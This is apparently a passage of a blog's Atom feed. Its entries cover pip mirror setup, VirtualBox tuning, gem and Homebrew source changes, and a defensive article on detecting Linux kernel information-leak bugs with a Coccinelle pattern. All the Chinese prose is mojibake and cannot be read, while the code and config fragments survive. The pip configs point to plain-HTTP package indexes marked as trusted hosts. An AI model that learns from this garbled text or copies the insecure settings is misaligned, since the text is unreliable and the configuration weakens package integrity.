.pip</code></p><p>ç„¶ååœ¨.pip æ–‡ä»¶å¤¹å†…<code>vim pip.conf</code>ï¼Œ</p><p>å†™å…¥é˜¿é‡Œäº‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥ä½¿ç”¨è±†ç“£çš„é•œåƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><p>å¥½äº†ç°åœ¨ä½ å¯ä»¥ä½“éªŒå¿«çš„é£èµ·çš„pipäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•-ä»¥python3-5ä¸ºä¾‹&quot;&gt;&lt;a href=&quot;#1-åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pipé•œåƒæºçš„æ–¹æ³•-ä»¥python3-5ä¸ºä¾‹&quot; class=&quot;headerlink&quot; title=&quot;1:åœ¨windowsç¯å¢ƒä¸‹ä¿®æ”¹pip
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ä½ ä¼šç”¨ä½ çš„è™šæ‹Ÿæœºå—?(ä¸€)</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80/"/>
    <id>http://zer0yu.github.io/2017/01/22/ä½ ä¼šç”¨ä½ çš„è™šæ‹Ÿæœºå—-ä¸€/</id>
    <published>2017-01-22T02:29:45.000Z</published>
    <updated>2017-01-22T02:36:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ€ä¹ˆå¯ä»¥è®©ä½ çš„è™šæ‹Ÿæœºè¿è¡Œçš„æ›´å¿«å‘¢ï¼Ÿ</p><h4 id="1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½"><a href="#1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½" class="headerlink" title="1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½"></a>1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½</h4><p>ç°åœ¨çš„CPUå‡ ä¹éƒ½æ”¯æŒç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½ï¼Œè‹±ç‰¹å°”ç§°ä¹‹ä¸ºVT-xæŠ€æœ¯ï¼ŒAMDç§°ä¹‹ä¸ºAMD-VæŠ€æœ¯ã€‚åœ¨ç™¾åº¦æœç´¢ä½ çš„ç¬”è®°æœ¬å‹å·æˆ–ä¸»æ¿å‹å·+å¼€å¯è™šæ‹ŸåŒ–ï¼Œå°±å¯ä»¥æ‰¾åˆ°ç›¸åº”çš„å¼€å¯æ–¹æ³•ã€‚ä¸€èˆ¬æ˜¯å¼€æœºè¿›å…¥biosï¼Œç„¶åæ‰¾åˆ°è™šæ‹ŸåŒ–æŠ€æœ¯çš„é€‰é¡¹ï¼Œå°†disabledæ”¹ä¸ºenabledã€‚æ®æˆ‘æ‰€çŸ¥ï¼Œç”¨è‹±ç‰¹å°”CPUçš„ç”µè„‘ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯çš„é€‰é¡¹åç§°å¤§æ¦‚å«æœ‰â€œvirtualization technologyâ€çš„å­—çœ¼ã€‚</p><p>BIOSå¼€å¯æˆåŠŸåï¼Œåœ¨è™šæ‹Ÿæœºçš„è®¾ç½®ä¸­ï¼Œå¯ç”¨ç¡¬ä»¶åŠ é€Ÿã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-1.png" alt="1"></p><p>å½“ä½ æˆåŠŸå¼€å¯ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½æ—¶ï¼Œè™šæ‹Ÿæœºçš„çª—å£å³ä¸‹è§’æœ‰ä¸€ä¸ªè“è‰²Vçš„å›¾æ ‡ï¼Œé¼ æ ‡ç§»ä¸Šå»å°±ä¼šæç¤ºæˆåŠŸå¼€å¯ã€‚</p><h4 id="2ã€ç»™è™šæ‹Ÿæœºåˆ†é…è¶³å¤Ÿçš„å†…å­˜"><a href="#2ã€ç»™è™šæ‹Ÿæœºåˆ†é…è¶³å¤Ÿçš„å†…å­˜" class="headerlink" title="2ã€ç»™è™šæ‹Ÿæœºåˆ†é…è¶³å¤Ÿçš„å†…å­˜"></a>2ã€ç»™è™šæ‹Ÿæœºåˆ†é…è¶³å¤Ÿçš„å†…å­˜</h4><p>æ—¢ç„¶æœ¬æœºæœ‰4GBçš„å†…å­˜ï¼Œé‚£ä¹ˆå¯ä»¥åˆ†é…1GBä¾›è™šæ‹Ÿæœºä¸Šçš„Ubuntuä½¿ç”¨ã€‚å†…å­˜å¤§å°æ ¹æ®è™šæ‹Ÿæœºç³»ç»Ÿçš„éœ€è¦æ¥å®šï¼Œå¦‚æœä½ è·‘XPï¼Œé‚£ä¹ˆåˆ†é…512MBå·²ç»å¾ˆè¶³å¤Ÿäº†ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-2.png" alt="2"></p><h4 id="3ã€å¼€å¯3DåŠ é€Ÿï¼Œåˆ†é…è¶³å¤Ÿæ˜¾å­˜"><a href="#3ã€å¼€å¯3DåŠ é€Ÿï¼Œåˆ†é…è¶³å¤Ÿæ˜¾å­˜" class="headerlink" title="3ã€å¼€å¯3DåŠ é€Ÿï¼Œåˆ†é…è¶³å¤Ÿæ˜¾å­˜"></a>3ã€å¼€å¯3DåŠ é€Ÿï¼Œåˆ†é…è¶³å¤Ÿæ˜¾å­˜</h4><p>ç¬”è€…è§‰å¾—å½“åˆUbuntuç•Œé¢å¡é¡¿å¾ˆæœ‰å¯èƒ½è·Ÿæ˜¾å¡æ–¹é¢çš„è®¾ç½®æœ‰å…³ã€‚äºæ˜¯å¼€å¯äº†3DåŠ é€Ÿï¼Œåˆ†é…äº†32MBçš„æ˜¾å­˜ç»™VirtualBoxã€‚æ€§èƒ½æå‡å¾ˆæ˜æ˜¾ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-3.png" alt="3"></p><h4 id="4ã€å®‰è£…VirtualBoxå¢å¼ºåŠŸèƒ½"><a href="#4ã€å®‰è£…VirtualBoxå¢å¼ºåŠŸèƒ½" class="headerlink" title="4ã€å®‰è£…VirtualBoxå¢å¼ºåŠŸèƒ½"></a>4ã€å®‰è£…VirtualBoxå¢å¼ºåŠŸèƒ½</h4><p>å¯åŠ¨è™šæ‹Ÿæœºã€‚å•å‡»è™šæ‹Ÿæœºèœå•ä¸­çš„â€œè®¾å¤‡â€&gt;â€œå®‰è£…å¢å¼ºåŠŸèƒ½â€ï¼Œä¹Ÿå¯ä»¥æŒ‰å¿«æ·é”®Host+Dã€‚Hosté”®å°±æ˜¯è™šæ‹Ÿæœºçª—å£å³ä¸‹æ–¹æ˜¾ç¤ºçš„é”®ï¼Œé»˜è®¤ä¸ºRight Ctrlï¼Œå³å³è¾¹çš„Ctrlé”®ã€‚ç„¶åç³»ç»Ÿä¼šåŠ è½½å¢å¼ºåŠŸèƒ½æ‰€åœ¨çš„è™šæ‹Ÿå…‰ç›˜ã€‚ç‚¹å‡»è¿è¡Œï¼ŒæŒ‰æç¤ºå®Œæˆå®‰è£…ï¼Œé‡å¯è™šæ‹Ÿæœºã€‚</p><h4 id="5ã€ç”µè„‘çš„æ ¸å¿ƒéƒ½æŒºå¤šçš„"><a href="#5ã€ç”µè„‘çš„æ ¸å¿ƒéƒ½æŒºå¤šçš„" class="headerlink" title="5ã€ç”µè„‘çš„æ ¸å¿ƒéƒ½æŒºå¤šçš„"></a>5ã€ç”µè„‘çš„æ ¸å¿ƒéƒ½æŒºå¤šçš„</h4><p>å¤šåˆ†ä¸ªæ ¸å°±å¥½äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ€ä¹ˆå¯ä»¥è®©ä½ çš„è™šæ‹Ÿæœºè¿è¡Œçš„æ›´å¿«å‘¢ï¼Ÿ&lt;/p&gt;
&lt;h4 id=&quot;1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½&quot;&gt;&lt;a href=&quot;#1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½&quot; class=&quot;headerlink&quot; title=&quot;1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½&quot;&gt;&lt;/a&gt;1ã€å¼€å¯CPUçš„ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gemæ›´æ¢å›½å†…æº</title>
    <link href="http://zer0yu.github.io/2017/01/22/gem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90/"/>
    <id>http://zer0yu.github.io/2017/01/22/gemæ›´æ¢å›½å†…æº/</id>
    <published>2017-01-22T02:26:43.000Z</published>
    <updated>2017-01-22T02:27:16.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gem sources -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ç§»é™¤https://rubygems.orgæº</span></span><br><span class="line"></span><br><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å¢åŠ https://gems.ruby-china.org/æº</span></span><br><span class="line"></span><br><span class="line">gem sources -a https://gems.ruby-china.org/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">æ›´æ–°ç¼“å­˜</span></span><br><span class="line"></span><br><span class="line">gem sources -u</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ›¿æ¢homebrewé»˜è®¤æº</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90/"/>
    <id>http://zer0yu.github.io/2017/01/22/æ›¿æ¢homebrewé»˜è®¤æº/</id>
    <published>2017-01-22T02:25:23.000Z</published>
    <updated>2017-01-22T02:26:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç½‘ä¸Šæœçš„å¥½å¤šéƒ½ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯å¯ä»¥çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd "$(brew --repo)"</span><br><span class="line">git remote set-url origin git://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç½‘ä¸Šæœçš„å¥½å¤šéƒ½ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯å¯ä»¥çš„ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linuxå†…æ ¸info leakæ¼æ´</title>
    <link href="http://zer0yu.github.io/2017/01/22/Linux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zer0yu.github.io/2017/01/22/Linuxå†…æ ¸info-leakæ¼æ´/</id>
    <published>2017-01-22T02:22:51.000Z</published>
    <updated>2017-01-22T02:24:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦: ä»‹ç»ä¸€ç§Linuxå†…æ ¸çš„ä¿¡æ¯æ³„æ¼æ¼æ´æ£€æµ‹æ–¹æ³•ã€‚æ²¡ä»€ä¹ˆå†…å®¹ï¼Œè¯­ä¹‰åˆ†æï¼Œå¯ä»¥é›†æˆåœ¨Coverityç­‰é™æ€æ‰«æå·¥å…·ä¸­ã€‚</p><h4 id="1-Information-Leakæ¼æ´é£é™©"><a href="#1-Information-Leakæ¼æ´é£é™©" class="headerlink" title="1  Information Leakæ¼æ´é£é™©"></a>1  Information Leakæ¼æ´é£é™©</h4><p>ä»åº”ç”¨å±‚è½¯ä»¶ï¼Œåˆ°hypervisorå†åˆ°kernelä»£ç ï¼Œéƒ½å­˜åœ¨Information <strong>Leak</strong>çš„é£é™©ã€‚ä¸‹é¢ç»™å‡ºä¸€äº›ç¤ºä¾‹ï¼š</p><p>åº”ç”¨å±‚è½¯ä»¶ï¼šé€šå¸¸æ˜¯åº”ç”¨æ•æ„Ÿæ•°æ®æ³„æ¼ï¼Œæ¯”å¦‚ä»è¿œç¨‹å®¢æˆ·ç«¯è·å–æœåŠ¡ç«¯æ•æ„Ÿæ•°æ®ã€‚CVE-2012-0053ï¼ŒOpensslçš„å¿ƒè„æ»´è¡€ç­‰ã€‚</p><p>Hypervisorï¼šä¸»è¦æ˜¯å‘guestæ³„æ¼hypervisoræ•°æ®ã€‚CVE-2010-4525.</p><p>Kernelä»£ç ï¼šæ³„æ¼å†…æ ¸åœ°å€ï¼Œç©ºé—´å¸ƒå±€ç­‰ï¼Œå¦‚CVE-2013-2147.</p><p>è¿™é‡Œä¸»è¦åˆ†æå†…æ ¸ä¸­çš„Information <strong>Leak</strong>æ¼æ´æ‰€å¸¦æ¥çš„é£é™©ã€‚å†…æ ¸ä¸­çš„Information <strong>Leak</strong>é€šå¸¸éƒ½æ˜¯ç”¨æ¥ç»•è¿‡å†…æ ¸ä¸­çš„ä¿æŠ¤æœºåˆ¶ï¼ˆåˆ©ç”¨ç¼“è§£ï¼šStackGuard, ASLRï¼‰ï¼Œç”±äºæœ¬èº«å¹¶ä¸èƒ½ç›´æ¥ç”¨æ¥å½¢æˆææƒç­‰é«˜é£é™©æ“ä½œï¼Œå› æ­¤Information <strong>Leak</strong>æ¼æ´ç»å¸¸è¢«äººå¿½è§†ã€‚</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹è¿™äº›ä¿æŠ¤æœºåˆ¶ã€‚</p><p>StackGuard.</p><p>StackGuardæ˜¯ä¸€ç§ç¼–è¯‘å™¨å®ç°çš„ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒåœ¨æ ˆå‡½æ•°è¿”å›åœ°å€å‰æ’å…¥ä¸€ä¸ªâ€œcanaryâ€ï¼Œå½“å‘ç”Ÿæº¢å‡ºâ€œcanaryâ€å€¼è¢«ç ´åï¼Œå°†è§¦å‘ç³»ç»Ÿçš„å¼‚å¸¸å¤„ç†æµç¨‹ã€‚å®ƒçš„å®‰å…¨æ€§ä¾èµ–äºâ€œcanaryâ€çš„ä¿å¯†ï¼Œä¹Ÿå°±æ˜¯â€œcanaryâ€ä¸èƒ½è¢«æ”»å‡»è€…é¢„æµ‹æˆ–å–åˆ°ã€‚</p><p>ASLR.</p><p>ASLRæŠ€æœ¯æ˜¯å°†è¿›ç¨‹ç­‰çš„åŠ è½½åœ°å€éšæœºåŒ–ï¼Œå®ƒçš„å®‰å…¨æ€§ä¾èµ–äºåŠ è½½åŸºåœ°å€çš„ä¸å¯é¢„æµ‹ï¼Œä½¿exploitä¸èƒ½ç²¾ç¡®è¿›è¡Œåœ°å€è¦†ç›–ã€‚</p><p>æ— è®ºâ€œcanaryâ€è¿˜æ˜¯ASLRçš„åŸºåœ°å€ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´éƒ½æ˜¯â€œç§˜å¯†â€ã€‚ä¹Ÿå°±æ˜¯åœ¨æ²¡æœ‰Information <strong>Leak</strong>æ¼æ´å‰æä¸‹ï¼Œè¿™äº›éƒ½æ˜¯ç”¨æˆ·ä¸å¯ç›´æ¥è·å–çš„ã€‚ä½†Information <strong>Leak</strong>æ¼æ´å¯ä»¥è¾…åŠ©æ”»å‡»è€…è·å–åˆ°è¿™äº›â€œç§˜å¯†â€ï¼Œè¿›è€Œç»•è¿‡å†…æ ¸ä¸­çš„ä¿æŠ¤æœºåˆ¶ï¼ŒæˆåŠŸå®ç°æ¼æ´åˆ©ç”¨ã€‚</p><h4 id="2-Information-Leakæ¼æ´åˆ†ç±»"><a href="#2-Information-Leakæ¼æ´åˆ†ç±»" class="headerlink" title="2  Information Leakæ¼æ´åˆ†ç±»"></a>2  Information Leakæ¼æ´åˆ†ç±»</h4><p>æ ¹æ®æ¼æ´æˆå› ï¼Œå¯ä»¥å¯¹Information <strong>Leak</strong>æ¼æ´è¿›è¡Œåˆ†ç±»ã€‚è¿™é‡ŒåŒæ ·åªå…³æ³¨å†…æ ¸ä¸­çš„æƒ…å†µã€‚</p><p>å­—èŠ‚å¯¹é½å¸¦æ¥çš„å†…å­˜â€œç©ºæ´â€.</p><p>ä¸ºäº†ç¨‹åºæ€§èƒ½ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä»£ç æ—¶ä¼šå¯¹å˜é‡è¿›è¡Œå­—èŠ‚å¯¹é½ï¼Œä»è€Œå¼•å…¥äº†ä¸€äº›å†…å­˜â€œç©ºæ´â€ã€‚æ¯”å¦‚ç»“æ„ä½“ä½¿ç”¨sizeofè®¡ç®—çš„å¤§å°ä¸€èˆ¬ä¼šå¤§äºå„ä¸ªæˆå‘˜å ç”¨ç©ºé—´å¤§å°çš„å’Œã€‚å½“è¿™äº›å†…æ ¸ä¸­çš„å†…å­˜â€œç©ºæ´â€æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼ˆABIæ²¡æœ‰è§„å®šå‡½æ•°é€€æ ˆæ—¶è¦æ¸…ç†è¿™äº›æ ˆç©ºé—´ï¼‰ï¼Œé€šè¿‡copy_to_userç­‰å‡½æ•°æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´æ—¶ï¼Œå°±ä¼šé€ æˆInformation <strong>Leak</strong>æ¼æ´ï¼Œæ³„æ¼å†…æ ¸æ ˆä¸­çš„æ•°æ®ï¼Œæ¯”å¦‚æ³„æ¼äº†ä¸€ä¸ªæ ˆä¸ŠæŒ‡é’ˆï¼Œå°±å¯ä»¥é€šè¿‡å®ƒæ¥è®¡ç®—è¿›ç¨‹åŸºå€ï¼ˆstackjackæ”»å‡»ï¼‰ã€‚</p><p>ç¼ºå°‘å˜é‡åˆå§‹åŒ–.</p><p>å†…æ ¸å‡½æ•°ä¸­çš„æœ¬åœ°å˜é‡å£°æ˜åï¼Œé»˜è®¤ä¸ä¼šè¢«åˆå§‹åŒ–ã€‚æ ¹æ®C99æè¿°è¿™å—ç©ºé—´çš„å†…å®¹æ˜¯ä¸ç¡®å®šçš„ã€‚å®é™…ä¸Šæ ˆç©ºé—´æ˜¯è¢«å„å‡½æ•°å¤ç”¨çš„ï¼Œå› æ­¤æœªåˆå§‹åŒ–å˜é‡çš„å†…å®¹å¾ˆå¯èƒ½ä¿å­˜çš„æ˜¯ä¸Šä¸ªå‡½æ•°æ ˆä¸Šçš„æ•°æ®ã€‚</p><p>ç¼ºå°‘å¯¹ç”¨æˆ·è¯»æ“ä½œçš„æ£€æŸ¥.</p><p>å½“å‘ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®æ—¶ï¼Œæ²¡æœ‰åšå¤§å°æ£€æŸ¥æˆ–è€…æ£€æŸ¥é€»è¾‘å‡ºç°é”™è¯¯ï¼Œéƒ½ä¼šå¯¼è‡´Information <strong>Leak</strong>ã€‚è¿™ç±»æ¼æ´é€šå¸¸ç§°ä½œâ€œè¶Šç•Œè¯»â€ï¼Œå®ƒå…è®¸ç”¨æˆ·æ€è¯»å–ä¸åº”è¯¥è¢«è®¿é—®çš„å†…æ ¸ç©ºé—´æ•°æ®ã€‚</p><p>å…¶å®ƒbugå¯¼è‡´çš„infoleaks.</p><p>å…¶å®ƒçš„Information <strong>Leak</strong>åŸå› è¿™é‡Œä¸åšç ”ç©¶ï¼Œä½†æä¸€ä¸‹ã€‚æ¯”å¦‚/proc/,/sys/å’Œ/boot/æ–‡ä»¶ç³»ç»Ÿä¸­ä¹Ÿæä¾›äº†å†…æ ¸ç¬¦å·åœ°å€ï¼Œå®ƒä»¬å·²ç»é kptr_restrictæœºåˆ¶ä¿æŠ¤ï¼Œä½†ä¹Ÿå¯èƒ½å› ä¸ºbugè€Œç»•è¿‡ã€‚å¦å¤–ç³»ç»Ÿç¼“å­˜ï¼Œæ—¥å¿—ç­‰éƒ½æœ‰å¯èƒ½å¯¼è‡´Information <strong>Leak</strong>.</p><p>ä¸Šé¢è¯´åˆ°Information <strong>Leak</strong>å¯èƒ½å±å®³ä¿è¯StackGuardå’ŒASLRå¯é åŸºç¡€çš„â€œç§˜å¯†â€ï¼Œä¸‹é¢åˆ†æä¸€ä¸‹å†…æ ¸ä¸­çš„Information <strong>Leak</strong>ç¡®åˆ‡ä¼šå½±å“å“ªäº›æ•°æ®ã€‚</p><p>Dataæ®µ.</p><p>å†…æ ¸ä¸­çš„dataæ®µä¿å­˜äº†ç¼–è¯‘æ—¶å°±ç¡®å®šçš„å…¨å±€å˜é‡ï¼Œdataæ®µçš„æ³„æ¼å¯èƒ½å¯¼è‡´é™æ€å†…æ ¸symbolsçš„æ³„æ¼ï¼Œæ¯”å¦‚æŸäº›ç”¨äºé…ç½®çš„å˜é‡ã€‚</p><p>æ ˆ</p><p>å†…æ ¸æ ˆæ˜¯æ ¹æ®ABIçº¦å®šï¼Œè¿è¡Œæ—¶åˆ†é…çš„ã€‚é‡Œé¢åŒ…å«äº†å‡½æ•°è¿”å›åœ°å€ï¼Œæ ˆæŒ‡é’ˆå’Œä¸€äº›å…¶å®ƒæ•°æ®ã€‚æ¯”å¦‚å‡½æ•°è°ƒç”¨çš„å‚æ•°ï¼ŒStackGuardæœºåˆ¶çš„â€œcanaryâ€ç­‰ã€‚å¦å¤–å¦‚æœæ²¡æœ‰å®ç°æ ˆåœ°å€éšæœºåŒ–ï¼Œè¿˜ä¼šæ³„æ¼æ ˆå¸ƒå±€ã€‚</p><p>å †</p><p>å†…æ ¸ä¸­çš„å †æ˜¯ç”±å†…å­˜åˆ†é…å™¨ç®¡ç†ï¼Œåœ¨éœ€è¦çš„åœ°æ–¹åŠ¨æ€åˆ†é…ã€‚è¿™äº›å †åˆ†é…å™¨é€šå¸¸ä½¿ç”¨åŒå‘é“¾è¡¨æ¥ç®¡ç†è¿™äº›å †å†…å­˜ã€‚Information <strong>Leak</strong>ä¼šæ¼æ´è¿™äº›å †å­˜å‚¨çš„å†…å®¹ï¼Œè¿˜æœ‰å¯èƒ½æ³„æ¼ç”¨äºå †ç®¡ç†çš„ç»“æ„æ•°æ®ã€‚</p><h4 id="3-æ ˆçš„Information-Leakæ¼æ´æ£€æµ‹æŠ€æœ¯"><a href="#3-æ ˆçš„Information-Leakæ¼æ´æ£€æµ‹æŠ€æœ¯" class="headerlink" title="3  æ ˆçš„Information Leakæ¼æ´æ£€æµ‹æŠ€æœ¯"></a>3  æ ˆçš„Information Leakæ¼æ´æ£€æµ‹æŠ€æœ¯</h4><p>åˆ†æç›®å‰çš„æ¼æ£€æµ‹æŠ€æœ¯ï¼Œå‘ç°é€šè¿‡æ•°æ®æµåˆ†æçš„æ–¹æ³•ï¼Œå¯ä»¥å¯¹Information <strong>Leak</strong>è¿›è¡Œå»ºæ¨¡æ¥è¿›è¡Œæ¼æ´æ£€æµ‹ã€‚åœ¨æ¨¡å‹é‡Œå®šä¹‰3ä¸ªåŸºæœ¬å…ƒç´ ï¼šæ•°æ®æºï¼Œæ•°æ®æ¥æ”¶æ–¹å’Œä¼ æ’­è·¯å¾„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œè¯­ä¹‰åˆ†ææ¥åŒ¹é…è¿™å¥—æ¨¡å‹ï¼Œä»è€Œè¯†åˆ«æ¼æ´ã€‚è¯­ä¹‰åˆ†æè¿™ä¸ªå·¥ä½œï¼Œé€‰ç”¨å¼€æºçš„Coccinelleå·¥å…·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">handler(...)Â &#123;</span><br><span class="line"></span><br><span class="line"> &lt;...</span><br><span class="line"></span><br><span class="line"> T ID;</span><br><span class="line"></span><br><span class="line"> ... when != memset(&amp;ID, 0,Â ...)</span><br><span class="line"></span><br><span class="line"> when != ID =Â ...</span><br><span class="line"></span><br><span class="line">* copy_to_user(EV,Â &amp;ID, EN)</span><br><span class="line"></span><br><span class="line"> ...&gt;&#125;</span><br></pre></td></tr></table></figure><p>1)  æ•°æ®æºï¼šIDå˜é‡</p><p>2)  æ•°æ®æ¥æ”¶æ–¹ï¼šç”¨æˆ·æ€æŒ‡é’ˆEV</p><p>3)  ä¼ æ’­è·¯å¾„ï¼šæˆ‘ä»¬æƒ³ç¡®å®šIDçš„å†…å®¹æ²¡æœ‰è¢«åˆå§‹åŒ–ã€‚å› æ­¤é™å®šæ¡ä»¶ï¼ŒIDåœ¨copy_to_userå‰æ²¡æœ‰memset()æˆ–åˆå§‹åŒ–æ“ä½œ</p><p>åƒå…¶å®ƒåŸºäºæ•°æ®æµçš„é™æ€æ£€æµ‹æŠ€æœ¯ç±»ä¼¼ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿå­˜åœ¨ç¼ºé™·ã€‚æ¯”å¦‚è¿™ç§Information <strong>Leak</strong>æ£€æµ‹æ–¹æ³•å‡å®šæ¼æ´å‘ç”Ÿåœ¨ä¸€ä¸ªå‡½æ•°å†…çš„ï¼Œå› æ­¤è¿™ç§æ–¹æ³•è¦†ç›–ä¸äº†å¤šå‡½æ•°åœºæ™¯ã€‚ä½†å®é™…æµ‹è¯•ä¸­ï¼Œä¾ç„¶ä¼šå‘ç°å¾ˆå¤šLinuxå†…æ ¸å’Œä¸‰æ–¹Driverçš„Information <strong>Leak</strong>æ¼æ´ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ‘˜è¦: ä»‹ç»ä¸€ç§Linuxå†…æ ¸çš„ä¿¡æ¯æ³„æ¼æ¼æ´æ£€æµ‹æ–¹æ³•ã€‚æ²¡ä»€ä¹ˆå†…å®¹ï¼Œè¯­ä¹‰åˆ†æï¼Œå¯ä»¥é›†æˆåœ¨Coverityç­‰é™æ€æ‰«æå·¥å…·ä¸­ã€‚&lt;/p&gt;
&lt;h4 id=&quot;1-Information-Leakæ¼æ´é£é™©&quot;&gt;&lt;a href=&quot;#1-Information-Leakæ¼æ´é£é™©&quot; class=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux-csi-toolséƒ¨ç½²è®°å½•</title>
    <link href="http://zer0yu.github.io/2017/01/21/linux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/"/>
    <id>http://zer0yu.github.io/2017/01/21/linux-csi-toolséƒ¨ç½²è®°å½•/</id>
    <published>2017-01-21T15:07:59.000Z</published>
    <updated>2017-01-21T15:19:09.000Z</updated>
    
